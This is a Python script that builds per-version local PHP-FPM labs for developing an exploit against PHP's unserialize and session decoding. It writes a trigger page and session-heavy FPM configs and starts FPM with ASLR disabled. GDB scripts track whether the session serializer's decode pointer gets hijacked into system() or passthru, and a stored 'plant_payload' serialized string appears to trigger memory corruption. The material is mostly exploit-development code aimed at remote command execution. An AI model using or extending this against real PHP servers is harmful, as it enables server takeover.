#!/usr/bin/env python3
"""Create one private FPM lab per version under labs/<version>/."""
import json, os, shutil, sys

R = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
VERS = ['7.0.33', '7.1.33', '7.2.34', '7.3.33', '8.0.30', '8.2.35', '8.3.36']
PORTS = {v: 28900 + i for i, v in enumerate(VERS)}

PROBE = '''<?php
echo "PID=", getmypid(), "\\n";
'''

TRIG = '''<?php
session_write_close();
session_start();
echo "PID=", getmypid(), " STATUS=", session_status(), "\\n";
'''

UNSER = '''<?php
$mode = $_POST['mode'] ?? 'user_error';
$p    = $_POST['p'] ?? 'x';
$pad  = (int)($_POST['pad'] ?? 0);
ini_set('memory_limit', '2M');
if ($pad > 0) {
    $GLOBALS['padbuf'] = str_repeat('P', $pad);
}
if ($mode === 'user_error') {
    set_error_handler(function ($no, $str) { trigger_error('stop', E_USER_ERROR); }, E_ALL);
}
echo "PID=", getmypid(), " MODE=", $mode, " PAD=", $pad, " PLEN=", strlen($p), "\\n";
$r = unserialize($p);
echo "AFTER type=", gettype($r), "\\n";
'''

START = '''#!/bin/bash
set -e
LAB="$(cd "$(dirname "$0")" && pwd)"
BIN="@BIN@"
unset USE_ZEND_ALLOC USE_TRACKED_ALLOC ASAN_OPTIONS ZEND_ALLOC_PRINT_LEAKS LD_PRELOAD
mkdir -p "$LAB/run" "$LAB/log" "$LAB/sessions"
rm -f "$LAB/run/php-fpm.pid"
( cd "$LAB" && exec setarch "$(uname -m)" -R "$BIN" --fpm-config "$LAB/conf/fpm.conf" ) >"$LAB/log/master.out" 2>&1
sleep 1
MASTER=$(cat "$LAB/run/php-fpm.pid")
CHILD=""
for i in $(seq 1 25); do
  CHILD=$(pgrep -P "$MASTER" | head -1)
  [ -n "$CHILD" ] && break
  sleep 0.2
done
echo "master=$MASTER child=$CHILD"
echo "$MASTER" > "$LAB/run/master.pid"
echo "$CHILD" > "$LAB/run/child.pid"
'''

FPM = '''[global]
pid = @LAB@/run/php-fpm.pid
error_log = @LAB@/log/fpm-error.log
daemonize = yes
log_level = notice
process_control_timeout = 5s

[lab]
listen = 127.0.0.1:@PORT@
user = davide
group = davide
pm = static
pm.max_children = 1
pm.max_requests = 0
catch_workers_output = yes
@DECORATE@clear_env = no

request_terminate_timeout = 60s
php_admin_value[memory_limit] = 128M
php_admin_value[precision] = 11
php_admin_value[error_reporting] = 32767
php_admin_value[display_errors] = 1
php_admin_value[display_startup_errors] = 1
php_admin_value[log_errors] = 1
php_admin_value[error_log] = @LAB@/log/php-error.log
php_admin_value[session.save_handler] = files
php_admin_value[session.save_path] = @LAB@/sessions
php_admin_value[session.serialize_handler] = php_binary
php_admin_value[session.auto_start] = 1
php_admin_value[session.use_strict_mode] = 0
php_admin_value[session.use_only_cookies] = 1
php_admin_value[session.upload_progress.enabled] = 1
php_admin_value[session.upload_progress.cleanup] = 0
php_admin_value[session.upload_progress.prefix] = ""
php_admin_value[session.upload_progress.name] = PHP_SESSION_UPLOAD_PROGRESS
php_admin_value[session.upload_progress.freq] = 1%
php_admin_value[session.upload_progress.min_freq] = 3600
php_admin_value[upload_max_filesize] = 64M
php_admin_value[post_max_size] = 128M
php_admin_value[max_file_uploads] = 20
'''

CALIB = '''set pagination off
set confirm off
handle SIGCHLD nostop noprint pass
handle SIGPIPE nostop noprint pass
set $nh = 0
break php_session_decode
commands
silent
set $nh = $nh + 1
printf "DECODE hit=%d data=%p val=%p len=%lu level=%ld bgdata=%p ser2decode=%p ser2name=%s\\n", $nh, $rdi, ((zend_string*)$rdi)->val, ((zend_string*)$rdi)->len, basic_globals.unserialize.level, basic_globals.unserialize.data, ps_serializers[2].decode, ps_serializers[2].name
x/9gx &ps_serializers
if $nh == 1
  printf "VAL1 first 0x40:\\n"
  x/8gx ((zend_string*)$rdi)->val
end
if $nh >= 2
  printf "VAL2 first 0x80:\\n"
  x/16gx ((zend_string*)$rdi)->val
  detach
  quit
end
continue
end
continue
printf "STOPPED rip=%p\\n", $rip
bt
info registers rip rdi rsi rdx rcx rax
detach
quit
'''

SER = '''set pagination off
set confirm off
printf "PSER0=%s|%p|%p\\n", ps_serializers[0].name, (void*)ps_serializers[0].encode, (void*)ps_serializers[0].decode
printf "PSER1=%s|%p|%p\\n", ps_serializers[1].name, (void*)ps_serializers[1].encode, (void*)ps_serializers[1].decode
printf "PSER2=%s|%p|%p\\n", ps_serializers[2].name, (void*)ps_serializers[2].encode, (void*)ps_serializers[2].decode
printf "PSER3NAME=%p\\n", (void*)ps_serializers[3].name
printf "PSER3ENC=%p\\n", (void*)ps_serializers[3].encode
printf "BG_LEVEL=%ld\\n", basic_globals.unserialize.level
printf "BG_DATA=%p\\n", basic_globals.unserialize.data
detach
quit
'''

STATE_OLD = '''set pagination off
set confirm off
set $lvl = basic_globals.unserialize.level
set $d = basic_globals.unserialize.data
printf "BG_LEVEL=%ld\\n", $lvl
printf "BG_DATA=%p\\n", $d
if $d
  printf "P_FIRST=%p\\n", $d->first
  printf "P_LAST=%p\\n", $d->last
  printf "P_FIRST_DTOR=%p\\n", $d->first_dtor
  printf "P_LAST_DTOR=%p\\n", $d->last_dtor
  x/4gx $d
  if $d->last_dtor
    printf "DTOR_USED=%ld\\n", ((var_dtor_entries*)$d->last_dtor)->used_slots
    printf "DTOR_NEXT=%p\\n", ((var_dtor_entries*)$d->last_dtor)->next
    x/4gx ((var_dtor_entries*)$d->last_dtor)
  end
end
detach
quit
'''

STATE_NEW = '''set pagination off
set confirm off
set $lvl = basic_globals.unserialize.level
set $d = basic_globals.unserialize.data
printf "BG_LEVEL=%ld\\n", $lvl
printf "BG_DATA=%p\\n", $d
if $d
  printf "P_LAST=%p\\n", $d->last
  printf "P_FIRST_DTOR=%p\\n", $d->first_dtor
  printf "P_LAST_DTOR=%p\\n", $d->last_dtor
  printf "CUR=%ld\\n", $d->cur_depth
  printf "MAX=%ld\\n", $d->max_depth
  printf "ENTRIES_USED=%ld\\n", $d->entries.used_slots
  x/8gx $d
  if $d->last_dtor
    printf "DTOR_USED=%ld\\n", $d->last_dtor->used_slots
    printf "DTOR_NEXT=%p\\n", $d->last_dtor->next
    x/4gx $d->last_dtor
  end
end
detach
quit
'''


SYS = '''set pagination off
set confirm off
printf "SYSTEM=%p\\n", (void*)system
detach
quit
'''

FINAL_SYSTEM = '''set pagination off
set confirm off
handle SIGCHLD nostop noprint pass
handle SIGPIPE nostop noprint pass
set $nh = 0
set $nf = 0
break php_session_decode
commands
silent
set $nh = $nh + 1
printf "DECODE hit=%d data=%p val=%p len=%lu level=%ld bgdata=%p ser2decode=%p ser2name=%s\\n", $nh, $rdi, ((zend_string*)$rdi)->val, ((zend_string*)$rdi)->len, basic_globals.unserialize.level, basic_globals.unserialize.data, ps_serializers[2].decode, ps_serializers[2].name
if $nh == 1
  x/8gx ((zend_string*)$rdi)->val
end
continue
end
break system
commands
silent
printf "SYSTEM hit cmd=%p\\n", $rdi
x/s $rdi
continue
end
break php_session_flush
commands
silent
set $nf = $nf + 1
printf "FLUSH n=%d ser2=%p\\n", $nf, ps_serializers[2].decode
if $nf >= 2
  detach
  quit
end
continue
end
continue
printf "STOPPED rip=%p\\n", $rip
bt
info registers rip rdi rsi rdx rcx rax
detach
quit
'''


def final(arg1, typ, after):
    return f'''set pagination off
set confirm off
handle SIGCHLD nostop noprint pass
handle SIGPIPE nostop noprint pass
set $nh = 0
break php_session_decode
commands
silent
set $nh = $nh + 1
printf "DECODE hit=%d data=%p val=%p len=%lu level=%ld bgdata=%p ser2decode=%p ser2name=%s\\n", $nh, $rdi, ((zend_string*)$rdi)->val, ((zend_string*)$rdi)->len, basic_globals.unserialize.level, basic_globals.unserialize.data, ps_serializers[2].decode, ps_serializers[2].name
if $nh == 1
  x/8gx ((zend_string*)$rdi)->val
end
continue
end
break zif_passthru
commands
silent
printf "ZIF_PASSTHRU hit rdi=%p rsi=%p rdx=%p\\n", $rdi, $rsi, $rdx
x/12gx $rdi
continue
end
break php_exec_ex
commands
silent
printf "PHP_EXEC_EX rdi=%p rsi=%p rdx=%p numargs=%u arg1val=%p arg1type=%u\\n", $rdi, $rsi, $rdx, *(unsigned int*)($rdi+0x2c), *(void**)($rdi+{hex(arg1)}), *(unsigned char*)($rdi+{hex(typ)})
set $f = *(void**)($rdi+{hex(arg1)})
if $f
  printf "F=%p F_PLUS_10_LEN=%lu\\n", $f, *(unsigned long*)($f+0x10)
  x/s $f+0x18
end
continue
end
break php_exec
commands
silent
printf "PHP_EXEC type=%d cmd=%p array=%p retval=%p\\n", (int)$rdi, $rsi, $rdx, $rcx
x/s $rsi
continue
end
break *{hex(after)}
commands
silent
printf "AFTER_PHP_EXEC eax=%d\\n", $eax
detach
quit
end
continue
printf "STOPPED rip=%p\\n", $rip
bt
info registers rip rdi rsi rdx rcx rax rsp rbp
x/4i $rip
detach
quit
'''


def main():
    d = json.load(open(os.path.join(R, 'static.json')))
    for v in VERS:
        s = d[v]
        lab = os.path.join(R, 'labs', v)
        for sub in ('www', 'conf', 'scripts', 'gdb', 'phase', 'req', 'run', 'log', 'sessions'):
            os.makedirs(os.path.join(lab, sub), exist_ok=True)
        open(os.path.join(lab, 'www', 'probe.php'), 'w').write(PROBE)
        open(os.path.join(lab, 'www', 'unser.php'), 'w').write(UNSER)
        open(os.path.join(lab, 'www', 'trig.php'), 'w').write(TRIG)
        decorate = '' if v in ('7.0.33', '7.1.33', '7.2.34') else 'decorate_workers_output = no\n'
        conf = FPM.replace('@LAB@', lab).replace('@PORT@', str(PORTS[v])).replace('@DECORATE@', decorate)
        open(os.path.join(lab, 'conf', 'fpm.conf'), 'w').write(conf)
        st = START.replace('@BIN@', s['binary'])
        p = os.path.join(lab, 'start.sh')
        open(p, 'w').write(st)
        os.chmod(p, 0o755)
        for f in ('fcgi.py', 'drv.py', 'mkrec.py'):
            shutil.copy2(os.path.join(R, 'scripts', f), os.path.join(lab, 'scripts', f))
        open(os.path.join(lab, 'gdb', 'calib.gdb'), 'w').write(CALIB)
        open(os.path.join(lab, 'gdb', 'ser.gdb'), 'w').write(SER)
        open(os.path.join(lab, 'gdb', 'state.gdb'), 'w').write(
            STATE_OLD if s['old_dtor'] else STATE_NEW)
        open(os.path.join(lab, 'gdb', 'final.gdb'), 'w').write(
            final(s['arg1_off'], s['type_off'], s['zif_passthru'] + 0x0e))
        open(os.path.join(lab, 'gdb', 'final_system.gdb'), 'w').write(FINAL_SYSTEM)
        open(os.path.join(lab, 'gdb', 'sys.gdb'), 'w').write(SYS)
        kind = 'system' if v in ('7.0.33', '7.1.33') else 'zif'
        json.dump({'version': v, 'port': PORTS[v], 'lab': lab, 'bin': s['binary'],
                   'md5': s['md5'], 'A': hex(s['A']), 'zif_system': hex(s['zif_system']),
                   'zif_passthru': hex(s['zif_passthru']), 'target_kind': kind,
                   'plant_payload': 'a:2:{i:0;s:3:"aaa";i:0;C:4:"Nope":0:{}}',
                   'marker': os.path.join(lab, 'PASSTHRU_' + v.replace('.', '')),
                   'key_len': s['key_len'], 'arg1_off': hex(s['arg1_off']),
                   'type_off': hex(s['type_off']), 'old_dtor': s['old_dtor'], 'real_p': s['old_dtor'], 'decode2': s['real_decode_entry2'],
                   'exec_size': s['exec_size']},
                  open(os.path.join(lab, 'lab.json'), 'w'), indent=1)
        print(v, PORTS[v], lab)


if __name__ == '__main__':
    main()
